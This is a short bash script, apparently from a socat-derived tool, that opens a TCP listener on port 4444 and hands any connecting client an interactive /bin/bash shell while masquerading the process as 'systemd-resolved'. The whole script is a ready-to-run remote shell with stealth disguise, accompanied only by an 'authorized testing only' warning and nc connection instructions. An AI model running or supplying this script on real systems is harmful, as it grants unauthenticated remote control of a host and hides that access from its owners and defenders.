#!/bin/bash
# Reverse shell relay example with systemd masquerade
# Creates a listener that relays to a shell

CONDUIT="${CONDUIT:-./socat-repo/conduit}"
PORT="${PORT:-4444}"

echo "Starting reverse shell listener on port $PORT"
echo "Masquerading as: systemd-resolved"
echo ""
echo "WARNING: For authorized testing only!"
echo ""

"$CONDUIT" -Mr \
    TCP-LISTEN:$PORT,fork,reuseaddr \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Usage:
# 1. Set PORT environment variable (optional, default 4444)
# 2. Run: PORT=5555 ./reverse-shell.sh
# 3. Connect with: nc localhost 5555
#
# IMPORTANT: Only use in authorized penetration testing environments
